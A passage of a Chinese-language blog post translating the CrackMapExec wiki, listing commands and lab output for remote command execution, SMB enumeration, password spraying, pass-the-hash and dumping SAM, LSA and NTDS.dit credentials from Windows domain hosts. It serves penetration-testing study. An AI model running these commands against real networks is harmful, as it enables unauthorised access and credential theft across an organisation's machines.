+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#~ crackmapexec 192.168.10.11 -u Administrator -p &#x27;P@ssw0rd&#x27; -x whoami</span><br><span class="line">06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)</span><br><span class="line">06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)</span><br><span class="line">06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         [+] Executed command </span><br><span class="line">06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         lab\administrator</span><br><span class="line">06-05-2016 14:34:39 [*] KTHXBYE!</span><br></pre></td></tr></table></figure>
+
+<p>你还可以使用-X标志来直接执行PowerShell命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#~ crackmapexec 192.168.10.11 -u Administrator -p &#x27;P@ssw0rd&#x27; -X &#x27;$PSVersionTable&#x27;</span><br><span class="line">06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)</span><br><span class="line">06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         [+] Executed command </span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         Name                           Value</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         ----                           -----</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSVersion                      2.0</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           &#123;1.0, 2.0&#125;</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1</span><br><span class="line">06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1</span><br><span class="line">06-05-2016 14:36:10 [*] KTHXBYE!</span><br></pre></td></tr></table></figure>
+
+<p>Powershell命令可以强制在32位进程中运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#~ crackmapexec 192.168.10.11 -u Administrator -p &#x27;P@ssw0rd&#x27; -X &#x27;[System.Environment]::Is64BitProcess&#x27; --force-ps32</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX          [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX          [+] LAB\Administrator:P@ssw0rd (Pwn3d!)</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX          [+] Executed command</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX          false</span><br></pre></td></tr></table></figure>
+
+<p>其他开关包括：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--no-output       Does not retrieve command results</span><br></pre></td></tr></table></figure>
+
+<h2 id="相关命令参考"><a href="#相关命令参考" class="headerlink" title="相关命令参考"></a>相关命令参考</h2><p><strong>SMB：命令参考</strong></p>
+<p>以下我们假设你已将Kali Linux主机连接到内网，且主机的IP段为192.168.1.0&#x2F;24。如果CME没有任何的输出，则可能是你的命令有误。</p>
+<p><strong>映射&#x2F;枚举</strong></p>
+<p><strong>映射网络主机</strong></p>
+<p>返回存活主机列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:OCEAN) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)</span><br></pre></td></tr></table></figure>
+
+<p><strong>生成中继列表</strong></p>
+<p>映射实时网络主机并仅保存需要SMB签名的主机列表。列表格式为每行一个IP。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">#~ cat relaylistOutputFilename.txt</span><br><span class="line">192.168.1.111</span><br><span class="line">192.168.1.117</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举共享</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --shares</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举有效sessions</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --sessions</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举磁盘</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --disks</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举登录用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --loggedon-users</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举域用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --users</span><br></pre></td></tr></table></figure>
+
+<p><strong>通过爆破RID枚举用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --rid-brute</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举域组</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --groups</span><br></pre></td></tr></table></figure>
+
+<p><strong>枚举本地组</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --local-groups</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取域密码策略</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --pass-pol</span><br></pre></td></tr></table></figure>
+
+<h2 id="身份验证-凭据检查（域）"><a href="#身份验证-凭据检查（域）" class="headerlink" title="身份验证+凭据检查（域）"></a>身份验证+凭据检查（域）</h2><p>登录失败 [ - ]<br>成功登录 [+] Domain\Username:Password</p>
+<p>本地管理员访问结果在登录确认后添加了（Pwn3d！），如下所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!) </span><br></pre></td></tr></table></figure>
+
+<p>以下检查将尝试对整个&#x2F;24网段进行身份验证，你也可以针对单个目标。</p>
+<p><strong>User&#x2F;Password</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>User&#x2F;Hash</strong></p>
+<p>获取凭据后例如：</p>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::</p>
+<p>你可以使用完整哈希或只使用nt哈希（后半部分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -H &#x27;LM:NT&#x27;</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -H &#x27;NTHASH&#x27;</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u Administrator -H &#x27;13b29964cc2480b4ef454c59562e675c&#x27;</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u Administrator -H &#x27;aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Null Sessions</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u &#x27;&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果有多个域正在运行，你可能需要使用-d来指定目标域。例如，对labnet.com域进行身份验证。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &quot;PASSWORDHERE&quot; -d LABNET</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用Username&#x2F;Password列表</strong></p>
+<p>你可以以空格分隔 名称&#x2F;密码 的形式使用多个用户名和密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18</span><br><span class="line">#~ cme smb 192.168.1.101 -u user1 -p password1 password2 password3</span><br></pre></td></tr></table></figure>
+
+<p>CME接受包含用户名和密码的txt文件（每行一个用户&#x2F;密码）。注意帐户锁定！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18</span><br><span class="line">#~ cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p><em>注意</em>：在默认情况下，CME将在成功登录后退出。如果你并不想退出，可以使用–continue-on-success标志。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<h2 id="身份验证-x2F-凭据检查（本地）"><a href="#身份验证-x2F-凭据检查（本地）" class="headerlink" title="身份验证&#x2F;凭据检查（本地）"></a>身份验证&#x2F;凭据检查（本地）</h2><p>将–local-auth添加到任何身份验证命令并尝试在本地登录。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u &#x27;&#x27; -p &#x27;&#x27; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -H &#x27;LM:NT&#x27; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -H &#x27;NTHASH&#x27; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u localguy -H &#x27;13b29964cc2480b4ef454c59562e675c&#x27; --local-auth</span><br><span class="line">#~ cme smb 192.168.1.0/24 -u localguy -H &#x27;aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c&#x27; --local-auth</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMB         192.168.1.101    445    HOSTNAME          [+] HOSTNAME\Username:Password (Pwn3d!)  </span><br></pre></td></tr></table></figure>
+
+<h2 id="获取凭证"><a href="#获取凭证" class="headerlink" title="获取凭证"></a>获取凭证</h2><p>以下示例使用用户名和明文密码，尽管用户&#x2F;散列组合也可以使用。</p>
+<p>需要目标域控制器上的域管理员或本地管理员权限。</p>
+<p><strong>使用secretsdump.py中的方法转储SAM哈希值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --sam</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用secretsdump.py中的方法转储LSA secrets</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --lsa</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用secretsdump.py中的方法从目标DC转储NTDS.dit</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2 methods are available:   </span><br><span class="line">(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   </span><br><span class="line">            additional drsuapi calls to convert the resultant linked-lists into readable format  </span><br><span class="line">      vss - Uses the Volume Shadow copy Service  </span><br><span class="line">#~ cme smb 192.168.1.100 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --ntds</span><br><span class="line">#~ cme smb 192.168.1.100 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --ntds vss</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用secretsdump.py中的方法从目标DC转储NTDS.dit密码历史记录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --ntds-history</span><br></pre></td></tr></table></figure>
+
+<p><strong>显示每个NTDS.dit帐户的pwdLastSet属性</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --ntds-pwdLastSet</span><br></pre></td></tr></table></figure>
+
+<h2 id="Spidering-Shares"><a href="#Spidering-Shares" class="headerlink" title="Spidering Shares"></a>Spidering Shares</h2><p>用于spider远程系统共享。</p>
+<p><strong>spider C盘中文件名中带有txt的文件（找到sometxtfile.html和somefile.txt）</strong></p>
+<p><strong>注意：</strong>‘$’字符必须进行转义。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme SMB &lt;IP&gt; -u USER -p PASSWORD --spider C\$ --pattern txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>WMI查询执行</strong></p>
+<p>有关wmi查询及语法的更多信息，请参阅：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/invoking-a-synchronous-query">https://docs.microsoft.com/en-us/windows/desktop/wmisdk/invoking-a-synchronous-query</a></p>
+<p><strong>发出指定的WMI查询</strong></p>
+<p>User&#x2F;Password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 10.10.33.121 -u Administrator -p &#x27;P@ssw0rd&#x27; --wmi &quot;SELECT * FROM Win32_logicalDisk WHERE DeviceID = &#x27;C:&#x27;&quot;</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         [*] Windows 7 Ultimate N 7601 Service Pack 1 x64 (name:WIN7BOX) (domain:LAB) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         Caption =&gt; C:</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         Description =&gt; Local Fixed Disk</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         InstallDate =&gt; 0</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         Name =&gt; C:</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         Status =&gt; 0</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         Availability =&gt; 0</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         CreationClassName =&gt; Win32_LogicalDisk</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         ConfigManagerErrorCode =&gt; 0</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         ConfigManagerUserConfig =&gt; 0</span><br><span class="line">SMB         192.168.10.11    445    WIN7BOX         DeviceID =&gt; C:</span><br></pre></td></tr></table></figure>
+
+<p><strong>WMI Namespace</strong></p>
+<p>User&#x2F;Password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb 192.168.1.0/24 -u UserNAme -p &#x27;PASSWORDHERE&#x27; --wmi-namespace &#x27;root\\cimv2&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP：命令参考"><a href="#HTTP：命令参考" class="headerlink" title="HTTP：命令参考"></a>HTTP：命令参考</h2><p>以下我们假设你已将Kali Linux主机连接到内网，且主机的IP段为192.168.1.0&#x2F;24。如果CME没有任何的输出，则可能是你的命令有误。</p>
+<p><strong>Own stuff using HTTP</strong></p>
+<p>需要安装phantomjs。如果你是通过apt-get进行安装的话，请先删除该版本，然后再从网站安装。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2</span><br><span class="line">&gt;tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2</span><br><span class="line">&gt;mv phantomjs-2.1.1-linux-x86_64/bin/phantomjs /bin/</span><br><span class="line">&gt;phantomjs -v</span><br></pre></td></tr></table></figure>
+
+<p><strong>映射&#x2F;枚举</strong></p>
+<p><strong>识别HTTP(S)服务器和指纹</strong></p>
+<p>返回实时webservers和banners列表</p>
+<p>默认检查：80,443,8443,8008,8080,8081 端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme http 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP        192.168.1.117    8080   192.168.1.117     [*] http://192.168.1.117:8080/ (Server: Apache-Coyote/1.1) (Page Title: Apache Tomcat)</span><br><span class="line">HTTP        192.168.1.117    80     192.168.1.117     [*] http://192.168.1.117/install/login (Server: Apache/2.4.18 (Ubuntu)) (Page Title: HackME)</span><br><span class="line">HTTP        192.168.1.120    80     192.168.1.120     [*] http://192.168.1.120/default.html (Server: IIS/8.5 (ASP.NET)) (Page Title: Welcome)</span><br><span class="line">HTTP        192.168.1.125    443    192.168.1.125     [*] https://192.168.1.125/ (Server: Jetty/8.0 ()) (Page Title: QuickStart)</span><br></pre></td></tr></table></figure>
+
+<p><strong>指定端口</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme http 192.168.1.0/24 --port 80 81 82 8080</span><br></pre></td></tr></table></figure>
+
+<p><strong>指定协议</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme http 192.168.1.0/24 --transports http</span><br></pre></td></tr></table></figure>
+
+<p>所在页面截图，并以 IP:Port_Year-month-day_time.png的格式保存在“&#x2F;.cme&#x2F;logs”目录下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#~ cme http 192.168.1.117 --port 80 81 82 8080 --screenshot</span><br><span class="line">HTTP        192.168.1.117    8080   192.168.1.117     [*] http://192.168.1.117:8080/ (Server: Apache-Coyote/1.1) (Page Title: Apache Tomcat)</span><br><span class="line">HTTP        192.168.1.117    80     192.168.1.117     [*] http://192.168.1.117/install/login (Server: Apache/2.4.18 (Ubuntu)) (Page Title: HackME)</span><br><span class="line">HTTP        192.168.1.117    8080   192.168.1.117     [+] Screenshot stored at /root/.cme/logs/192.168.1.117:8080_2018-08-29_093828.png</span><br><span class="line">HTTP        192.168.1.117    80     192.168.1.117     [+] Screenshot stored at /root/.cme/logs/192.168.1.117:80_2018-08-29_093828.png</span><br></pre></td></tr></table></figure>
+
+<p>*<strong>参考来源：<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec/wiki">github</a>，FB小编 secist 编译，<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/184573.html">CrackMapExec：一款针对大型Windows活动目录(AD)的后渗透工具 - FreeBuf网络安全行业门户</a></strong></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/10/24/crackmapexec%E9%A3%9F%E7%94%A8/" target="_blank">crackmapexec食用</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
+                        
+                            <a href="/categorie/%E5%86%85%E7%BD%91/">内网</a>
+                        
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
+                        
+                            <a href="/tag/%E5%86%85%E7%BD%91/">内网</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/2023/10/24/HTB-Manager-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" class="prev-prefix">« </a> 上一篇：    <a href="/2023/10/24/HTB-Manager-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" title="发布于 2023-10-24 02:04">HTB_Manager-第三季度</a>
+                        <br>
+                    
+                    
+                        <a href="/2023/10/18/HTB-Drive-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" class="next-prefix">» </a> 下一篇：    <a href="/2023/10/18/HTB-Drive-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" title="发布于 2023-10-18 06:19">HTB_Drive-第三季度</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+
+        </div>
+    
+</div>
+    <div id="footer"></div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>简单地活着，肆意而又精彩！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/touxiang.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user"><span>章鱼海绵</span></div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://www.4399.com/" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://www.4399.com/" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
